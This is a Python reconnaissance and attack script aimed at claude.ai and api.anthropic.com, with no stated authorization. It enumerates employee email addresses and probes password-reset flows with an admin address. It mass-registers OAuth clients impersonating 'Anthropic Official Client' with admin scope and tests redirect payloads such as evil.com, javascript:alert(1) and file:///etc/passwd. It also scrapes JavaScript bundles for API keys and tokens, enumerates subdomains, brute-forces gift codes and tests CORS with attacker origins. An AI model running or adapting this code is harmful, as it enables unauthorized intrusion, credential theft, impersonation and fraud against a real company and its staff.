#!/usr/bin/env python3
"""
Anthropic Comprehensive Recon Engine
Vectors: Email enum, OAuth abuse, JS mining, subdomains, SSO probing, credential leaks
"""
import asyncio, json, os, re, hashlib, base64, secrets, subprocess, time
from urllib.parse import urlencode, quote

OUTPUT_DIR = "/tmp/anthropic-recon"
os.makedirs(OUTPUT_DIR, exist_ok=True)

FINDINGS = []

def save():
    with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
        json.dump(FINDINGS, fp, indent=2)

async def fetch(page, url, method="GET", body=None, extra_headers=None):
    try:
        body_json = json.dumps(body) if body else "null"
        has_body = body is not None
        hdr_js = ""
        if extra_headers:
            for hk, hv in extra_headers.items():
                hdr_js += f"'{hk}': '{hv}', "
        if has_body:
            r = await page.evaluate(f"""async () => {{
                const s = performance.now();
                try {{
                    const resp = await fetch('{url}', {{
                        method: '{method}', credentials: 'include',
                        headers: {{'Content-Type': 'application/json', {hdr_js}}},
                        body: JSON.stringify({body_json})
                    }});
                    const t = await resp.text();
                    return {{status: resp.status, body: t.substring(0, 8000), size: t.length, time: performance.now()-s, headers: Object.fromEntries(resp.headers.entries())}};
                }} catch(e) {{ return {{error: e.message}}; }}
            }}""")
        else:
            r = await page.evaluate(f"""async () => {{
                const s = performance.now();
                try {{
                    const resp = await fetch('{url}', {{
                        method: '{method}', credentials: 'include',
                        headers: {{{hdr_js}}}
                    }});
                    const t = await resp.text();
                    return {{status: resp.status, body: t.substring(0, 8000), size: t.length, time: performance.now()-s, headers: Object.fromEntries(resp.headers.entries())}};
                }} catch(e) {{ return {{error: e.message}}; }}
            }}""")
        return r
    except:
        return {"status": 0, "body": ""}

def curl(url, method="GET", data=None, headers=None):
    cmd = ["curl", "-s", "-w", "\n%{http_code}", "-L", "--max-time", "10"]
    if method == "POST":
        cmd += ["-X", "POST"]
    if headers:
        for k, v in headers.items():
            cmd += ["-H", f"{k}: {v}"]
    if data:
        cmd += ["-H", "Content-Type: application/json", "-d", json.dumps(data)]
    cmd.append(url)
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    lines = result.stdout.rsplit("\n", 1)
    body = lines[0] if len(lines) > 1 else ""
    code = lines[-1].strip() if lines else "000"
    return code, body

async def main():
    from cloakbrowser import launch_async
    browser = await launch_async(headless=True)
    context = await browser.new_context()
    page = await context.new_page()

    print("🌐 Loading claude.ai...")
    await page.goto("https://claude.ai", wait_until="networkidle", timeout=30000)
    await asyncio.sleep(3)

    # =========================================================================
    # VECTOR 1: SMART EMAIL ENUMERATION
    # =========================================================================
    print("\n" + "="*70)
    print("VECTOR 1: SMART EMPLOYEE EMAIL ENUMERATION")
    print("="*70)

    # Known Anthropic employees from public sources (papers, GitHub, talks)
    known_names = [
        # Founders/Execs
        "dario", "dan", "chris", "tom", "jason",
        # From GitHub/papers
        "alex", "sam", "jake", "max", "nick", "ben", "matt", "ryan",
        "andrew", "brian", "david", "james", "john", "michael", "peter",
        "sarah", "jessica", "emily", "anna", "kate", "lisa", "maria",
        # Engineering
        "eng", "sre", "devops", "platform", "infra", "backend", "frontend",
        "ml", "research", "security", "privacy", "compliance",
        # Teams
        "team", "hello", "hi", "info", "support", "admin", "billing",
        "legal", "pr", "marketing", "sales", "hr", "recruiting",
        "press", "media", "partners", "enterprise", "customers",
    ]

    # Common email formats
    formats = [
        "{name}@anthropic.com",
        "{name}.admin@anthropic.com",
    ]

    sso_emails = []
    normal_emails = []
    blocked_emails = []

    for name in known_names:
        for fmt in formats:
            email = fmt.format(name=name)
            url = f"https://claude.ai/api/auth/login_methods?email={email}&source=claude-ai"
            code, body = curl(url)
            try:
                data = json.loads(body)
                methods = data.get("methods", [])
                if methods == ["sso"]:
                    sso_emails.append(email)
                    print(f"   🔥 SSO: {email}")
                elif methods:
                    normal_emails.append(email)
                else:
                    blocked_emails.append(email)
            except:
                pass
            await asyncio.sleep(0.1)

    # Test subdomains
    print(f"\n   Testing email subdomains...")
    subdomains = ["us", "eu", "uk", "de", "jp", "sg", "au"]
    for sub in subdomains:
        email = f"admin@{sub}.anthropic.com"
        code, body = curl(f"https://claude.ai/api/auth/login_methods?email={email}&source=claude-ai")
        try:
            data = json.loads(body)
            methods = data.get("methods", [])
            if methods:
                print(f"   🔥 {sub}.anthropic.com → {methods}")
                FINDINGS.append({"vector": "email-subdomain", "email": email, "methods": methods})
                save()
        except:
            pass

    print(f"\n   📊 SSO emails found: {len(sso_emails)}")
    print(f"   📊 Normal emails: {len(normal_emails)}")
    print(f"   📊 Blocked: {len(blocked_emails)}")
    FINDINGS.append({"vector": "email-enum", "sso": sso_emails, "normal": normal_emails, "blocked": blocked_emails})
    save()

    # =========================================================================
    # VECTOR 2: PASSWORD RESET / FORGOT PASSWORD FLOW
    # =========================================================================
    print("\n" + "="*70)
    print("VECTOR 2: PASSWORD RESET / FORGOT PASSWORD FLOW")
    print("="*70)

    reset_endpoints = [
        "/api/auth/forgot-password",
        "/api/auth/reset-password",
        "/api/auth/password-reset",
        "/api/auth/send-reset",
        "/api/auth/recover",
        "/api/auth/recovery",
        "/api/auth/reset",
        "/api/auth/forgot",
        "/api/auth/magic-link",
        "/api/auth/send-magic-link",
        "/api/auth/email-verify",
        "/api/auth/verify-email",
        "/api/auth/confirm-email",
    ]

    for ep in reset_endpoints:
        # GET
        code, body = curl(f"https://claude.ai{ep}")
        if code not in ["000", "404"]:
            print(f"   GET {ep}: {code} | {body[:100]}")
            FINDINGS.append({"vector": "reset-flow", "endpoint": ep, "method": "GET", "status": code, "body": body[:500]})
            save()

        # POST with email
        code, body = curl(f"https://claude.ai{ep}", "POST", {"email": "test@test.com"})
        if code not in ["000", "404"]:
            print(f"   POST {ep}: {code} | {body[:100]}")
            FINDINGS.append({"vector": "reset-flow", "endpoint": ep, "method": "POST", "status": code, "body": body[:500]})
            save()

        # POST with Anthropic email
        code, body = curl(f"https://claude.ai{ep}", "POST", {"email": "admin@anthropic.com"})
        if code not in ["000", "404"]:
            print(f"   POST {ep} (admin): {code} | {body[:100]}")
            FINDINGS.append({"vector": "reset-flow-admin", "endpoint": ep, "method": "POST", "status": code, "body": body[:500]})
            save()

        await asyncio.sleep(0.15)

    # =========================================================================
    # VECTOR 3: OAUTH FULL ABUSE CHAIN
    # =========================================================================
    print("\n" + "="*70)
    print("VECTOR 3: OAUTH FULL ABUSE CHAIN")
    print("="*70)

    # Register many clients for confusion attack
    print("   Registering 10 OAuth clients for confusion attack...")
    clients = []
    for i in range(10):
        name = f"Anthropic Official Client {i}"
        code, body = curl("https://api.anthropic.com/register", "POST", {
            "client_name": name,
            "redirect_uris": ["http://localhost"],
            "scope": "openid profile email admin",
            "grant_types": ["authorization_code", "refresh_token"]
        })
        try:
            data = json.loads(body)
            cid = data.get("client_id", "")
            csecret = data.get("client_secret", "")
            clients.append({"name": name, "client_id": cid, "client_secret": csecret})
            print(f"   Registered: {name} → {cid}")
        except:
            pass
        await asyncio.sleep(0.1)

    FINDINGS.append({"vector": "oauth-clients", "clients": clients})
    save()

    # Test device code flow
    print("\n   Testing OAuth device code flow...")
    code, body = curl("https://api.anthropic.com/oauth/device", "POST", {
        "client_id": clients[0]["client_id"] if clients else "test",
        "scope": "openid profile email"
    })
    print(f"   Device code: {code} | {body[:200]}")
    FINDINGS.append({"vector": "oauth-device", "status": code, "body": body[:500]})
    save()

    # Test authorization with each redirect URI
    print("\n   Testing redirect URI variations...")
    redirect_tests = [
        "http://localhost",
        "https://claude.ai",
        "https://anthropic.com",
        "http://localhost:3000/callback",
        "https://evil.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "file:///etc/passwd",
        "ftp://evil.com",
        "custom://app",
    ]

    for uri in redirect_tests:
        # Register
        code, body = curl("https://api.anthropic.com/register", "POST", {
            "client_name": "redirect-test",
            "redirect_uris": [uri]
        })
        try:
            data = json.loads(body)
            cid = data.get("client_id", "")
            if cid:
                # Try authorization
                code_v = secrets.token_urlsafe(32)
                digest = hashlib.sha256(code_v.encode()).digest()
                challenge = base64.urlsafe_b64encode(digest).rstrip(b'=').decode()
                auth_url = f"https://api.anthropic.com/authorize?response_type=code&client_id={cid}&redirect_uri={quote(uri)}&scope=openid&code_challenge={challenge}&code_challenge_method=S256"
                code2, body2 = curl(auth_url)
                is_error = "invalid" in body2.lower() or "error" in body2.lower()
                redirect_works = code2 in ["302", "303"] and not is_error
                if redirect_works:
                    print(f"   🔥 REDIRECT WORKS: {uri} → {code2}")
                    FINDINGS.append({"vector": "oauth-redirect", "uri": uri, "status": code2, "body": body2[:300]})
                    save()
                else:
                    print(f"   ❌ {uri}: {code2} | {body2[:80]}")
        except:
            pass
        await asyncio.sleep(0.15)

    # =========================================================================
    # VECTOR 4: SSO / SAML / OIDC METADATA PROBING
    # =========================================================================
    print("\n" + "="*70)
    print("VECTOR 4: SSO / SAML / OIDC METADATA")
    print("="*70)

    sso_endpoints = [
        "/.well-known/openid-configuration",
        "/.well-known/openid/connect",
        "/saml/metadata",
        "/saml/metadata.xml",
        "/saml/sso",
        "/saml/acs",
        "/saml/slo",
        "/.well-known/saml-configuration",
        "/auth/saml/metadata",
        "/auth/saml/sso",
        "/sso/saml",
        "/sso/oidc",
        "/identity/metadata",
        "/identity/sso",
        "/enterprise/sso",
        "/enterprise/saml",
        "/enterprise/oidc",
        "/scim/v2",
        "/scim/Users",
        "/scim/Groups",
        "/.well-known/scim-configuration",
    ]

    for ep in sso_endpoints:
        code, body = curl(f"https://claude.ai{ep}")
        if code not in ["000", "404"]:
            print(f"   🔥 {ep}: {code} | {body[:150]}")
            FINDINGS.append({"vector": "sso-metadata", "endpoint": ep, "status": code, "body": body[:1000]})
            save()
        await asyncio.sleep(0.1)

    # Also check api.anthropic.com
    for ep in ["/.well-known/openid-configuration", "/saml/metadata", "/.well-known/saml-configuration"]:
        code, body = curl(f"https://api.anthropic.com{ep}")
        if code not in ["000", "404"]:
            print(f"   🔥 api{ep}: {code} | {body[:150]}")
            FINDINGS.append({"vector": "sso-metadata", "endpoint": f"api{ep}", "status": code, "body": body[:1000]})
            save()
        await asyncio.sleep(0.1)

    # Check subdomains for SSO
    for sub in ["sso", "login", "auth", "identity", "enterprise", "okta", "onelogin", "auth0"]:
        code, body = curl(f"https://{sub}.anthropic.com/.well-known/openid-configuration")
        if code not in ["000", "502", "503"]:
            print(f"   🔥 {sub}.anthropic.com OIDC: {code} | {body[:150]}")
            FINDINGS.append({"vector": "sso-subdomain", "subdomain": sub, "status": code, "body": body[:1000]})
            save()
        await asyncio.sleep(0.1)

    # =========================================================================
    # VECTOR 5: JS BUNDLE MINING FOR SECRETS
    # =========================================================================
    print("\n" + "="*70)
    print("VECTOR 5: JS BUNDLE MINING FOR SECRETS")
    print("="*70)

    # Get all JS bundle URLs from page
    js_urls = await page.evaluate("""() => {
        const scripts = document.querySelectorAll('script[src]');
        return Array.from(scripts).map(s => s.src).filter(s => s.includes('assets'));
    }""")

    all_secrets = []
    all_endpoints = set()
    all_feature_flags = set()

    for js_url in js_urls[:20]:
        js_content = await page.evaluate(f"""async () => {{
            try {{
                const resp = await fetch('{js_url}');
                return await resp.text();
            }} catch(e) {{ return ''; }}
        }}""")

        if not js_content:
            continue

        # Search for secrets/keys
        secret_patterns = [
            (r'["\']sk-[a-zA-Z0-9_-]{20,}["\']', "API_KEY"),
            (r'["\']sk_live_[a-zA-Z0-9_-]+["\']', "STRIPE_LIVE_KEY"),
            (r'["\']sk_test_[a-zA-Z0-9_-]+["\']', "STRIPE_TEST_KEY"),
            (r'["\']pk_live_[a-zA-Z0-9_-]+["\']', "STRIPE_PK_LIVE"),
            (r'["\']pk_test_[a-zA-Z0-9_-]+["\']', "STRIPE_PK_TEST"),
            (r'["\']ghp_[a-zA-Z0-9]+["\']', "GITHUB_TOKEN"),
            (r'["\']xox[bps]-[a-zA-Z0-9-]+["\']', "SLACK_TOKEN"),
            (r'["\']AKIA[A-Z0-9]{16}["\']', "AWS_ACCESS_KEY"),
            (r'Authorization["\']:\s*["\']Bearer\s+[a-zA-Z0-9._-]+["\']', "BEARER_TOKEN"),
            (r'["\'][a-f0-9]{32}["\']', "POSSIBLE_SECRET"),
            (r'["\'][a-f0-9]{40}["\']', "POSSIBLE_HASH"),
            (r'webhook.*?["\']https?://[^"\']+["\']', "WEBHOOK_URL"),
            (r'["\']https?://[^"\']*secret[^"\']*["\']', "SECRET_URL"),
            (r'["\']https?://[^"\']*api[_-]?key[^"\']*["\']', "API_KEY_URL"),
        ]

        for pattern, label in secret_patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for m in matches:
                all_secrets.append({"file": js_url.split("/")[-1], "type": label, "value": m[:200]})
                print(f"   🔥 {label}: {m[:100]}")

        # Extract API endpoints
        api_matches = re.findall(r'["\'](/(?:api|edge-api|v1|v2|graphql|oauth|auth|admin|internal)[\w/._-]*)["\']', js_content)
        all_endpoints.update(api_matches)

        # Extract feature flags
        flag_matches = re.findall(r'["\']([\w.-]+(?:flag|feature|experiment|beta|toggle)[\w.-]*)["\']', js_content, re.IGNORECASE)
        all_feature_flags.update(flag_matches)

        await asyncio.sleep(0.2)

    if all_secrets:
        print(f"\n   📊 Secrets found: {len(all_secrets)}")
        FINDINGS.append({"vector": "js-secrets", "secrets": all_secrets})
        save()

    if all_endpoints:
        print(f"   📊 Endpoints found: {len(all_endpoints)}")
        for ep in sorted(all_endpoints)[:30]:
            print(f"      {ep}")
        FINDINGS.append({"vector": "js-endpoints", "endpoints": sorted(list(all_endpoints))})
        save()

    if all_feature_flags:
        print(f"   📊 Feature flags: {len(all_feature_flags)}")
        for f in sorted(all_feature_flags):
            print(f"      {f}")
        FINDINGS.append({"vector": "js-feature-flags", "flags": sorted(list(all_feature_flags))})
        save()

    # =========================================================================
    # VECTOR 6: SUBDOMAIN DEEP ENUMERATION
    # =========================================================================
    print("\n" + "="*70)
    print("VECTOR 6: SUBDOMAIN DEEP ENUMERATION")
    print("="*70)

    subdomains_to_test = [
        "dev", "staging", "stage", "internal", "corp", "vpn", "gateway",
        "proxy", "edge", "cdn", "static", "assets", "media", "img",
        "mcp", "connectors", "code", "cowork", "platform", "sso",
        "login", "auth", "identity", "enterprise", "okta", "onelogin",
        "auth0", "firebase", "supabase", "hasura", "strapi",
        "admin", "panel", "dashboard", "monitor", "metrics",
        "grafana", "kibana", "sentry", "datadog", "newrelic",
        "ci", "cd", "build", "deploy", "release", "artifact",
        "registry", "docker", "k8s", "kube", "cluster",
        "db", "database", "postgres", "mysql", "mongo", "redis",
        "queue", "rabbitmq", "kafka", "sqs", "sns",
        "search", "elasticsearch", "opensearch", "algolia",
        "ml", "model", "training", "inference", "gpu",
        "data", "warehouse", "lake", "analytics", "bi",
        "logs", "audit", "compliance", "security", "waf",
        "billing", "pay", "stripe", "charge", "invoice",
        "support", "help", "docs", "wiki", "notion",
        "status", "health", "ping", "ready", "live",
        "ws", "websocket", "socket", "realtime", "stream",
        "chat", "message", "notification", "push", "email",
        "sms", "twilio", "sendgrid", "ses",
        "storage", "s3", "gcs", "blob", "upload",
        "backup", "restore", "archive", "cold",
        "test", "qa", "staging", "preprod", "canary",
        "feature", "flag", "experiment", "ab",
        "beta", "alpha", "preview", "rc",
    ]

    alive_subdomains = []
    for sub in subdomains_to_test:
        code, _ = curl(f"https://{sub}.anthropic.com", "GET", None, {"Host": f"{sub}.anthropic.com"})
        if code not in ["000", "502", "503", "530"]:
            print(f"   🔥 {sub}.anthropic.com → {code}")
            alive_subdomains.append({"subdomain": sub, "status": code})
            FINDINGS.append({"vector": "subdomain", "subdomain": f"{sub}.anthropic.com", "status": code})
            save()
        await asyncio.sleep(0.05)

    # =========================================================================
    # VECTOR 7: CREDENTIAL LEAK SEARCH
    # =========================================================================
    print("\n" + "="*70)
    print("VECTOR 7: CREDENTIAL LEAK IN RESPONSE HEADERS/BODY")
    print("="*70)

    # Check for leaked headers on various endpoints
    leak_urls = [
        "https://claude.ai/",
        "https://claude.ai/edge-api/bootstrap",
        "https://api.anthropic.com/.well-known/oauth-authorization-server",
        "https://billing.anthropic.com/",
        "https://a-api.anthropic.com/v1/batch",
    ]

    for url in leak_urls:
        r = await fetch(page, url)
        headers = r.get("headers", {})
        body = r.get("body", "")

        # Check for interesting headers
        for hk, hv in headers.items():
            hk_lower = hk.lower()
            if any(kw in hk_lower for kw in ["auth", "token", "key", "secret", "password", "credential", "session", "set-cookie", "x-api", "x-debug", "x-internal", "x-staging"]):
                print(f"   🔥 Header leak: {hk}: {hv[:100]}")
                FINDINGS.append({"vector": "header-leak", "url": url, "header": hk, "value": hv[:200]})
                save()

        # Check body for tokens
        token_patterns = [
            r'sk-[a-zA-Z0-9_-]{20,}',
            r'Bearer\s+[a-zA-Z0-9._-]{20,}',
            r'"token":\s*"[^"]{20,}"',
            r'"api_key":\s*"[^"]{20,}"',
            r'"secret":\s*"[^"]{20,}"',
            r'"password":\s*"[^"]{5,}"',
        ]
        for pat in token_patterns:
            matches = re.findall(pat, body)
            for m in matches:
                print(f"   🔥 Body leak: {m[:100]}")
                FINDINGS.append({"vector": "body-leak", "url": url, "match": m[:200]})
                save()

        await asyncio.sleep(0.2)

    # =========================================================================
    # VECTOR 8: GIFT CODE BRUTE FORCE
    # =========================================================================
    print("\n" + "="*70)
    print("VECTOR 8: GIFT CODE PATTERNS")
    print("="*70)

    # Test common gift code patterns
    gift_patterns = [
        "FREE", "GIFT", "WELCOME", "BONUS", "PROMO", "DEAL",
        "SAVE", "OFF", "DISCOUNT", "TRIAL", "TEST", "ADMIN",
        "ALPHA", "BETA", "LAUNCH", "NEW", "HOLIDAY", "SUMMER",
        "2024", "2025", "2026", "NY2025", "NY2026",
        "AAAA", "BBBB", "ABCD", "1234", "0000", "9999",
    ]

    for code in gift_patterns:
        url = f"https://claude.ai/api/billing/gift/validate?code={code}"
        r = await fetch(page, url)
        body = r.get("body", "")
        try:
            data = json.loads(body)
            if data.get("valid") == True:
                print(f"   🔥🔥🔥 VALID GIFT CODE: {code}")
                FINDINGS.append({"vector": "gift-valid", "code": code, "body": body[:500]})
                save()
            elif data.get("error") != "Gift code not found.":
                print(f"   ⚠️ Different error for {code}: {data.get('error')}")
                FINDINGS.append({"vector": "gift-diff-error", "code": code, "error": data.get("error")})
                save()
        except:
            pass
        await asyncio.sleep(0.1)

    # =========================================================================
    # VECTOR 9: CORS TESTING ON OPEN ENDPOINTS
    # =========================================================================
    print("\n" + "="*70)
    print("VECTOR 9: CORS TESTING")
    print("="*70)

    cors_origins = [
        "https://evil.com",
        "https://claude.ai.evil.com",
        "https://anthropic.com.evil.com",
        "null",
        "https://localhost",
    ]

    cors_urls = [
        "https://a-api.anthropic.com/v1/batch",
        "https://claude.ai/edge-api/bootstrap",
        "https://claude.ai/api/auth/login_methods?email=test@test.com&source=claude-ai",
    ]

    for url in cors_urls:
        for origin in cors_origins:
            r = await fetch(page, url, "OPTIONS", None, {"Origin": origin, "Access-Control-Request-Method": "POST"})
            headers = r.get("headers", {})
            acao = headers.get("access-control-allow-origin", "")
            acac = headers.get("access-control-allow-credentials", "")
            if acao:
                print(f"   {url[:50]:50s} Origin={origin:40s} → ACAO={acao} ACAC={acac}")
                if acao != "*" or acac == "true":
                    FINDINGS.append({"vector": "cors", "url": url, "origin": origin, "acao": acao, "acac": acac})
                    save()
            await asyncio.sleep(0.1)

    # =========================================================================
    # FINAL SUMMARY
    # =========================================================================
    print(f"\n{'='*70}")
    print(f"📊 RECON COMPLETE — {len(FINDINGS)} findings")
    print(f"{'='*70}")
    for f in FINDINGS:
        print(f"   [{f['vector']}] {json.dumps(f)[:120]}")

    await browser.close()

if __name__ == "__main__":
    asyncio.run(main())
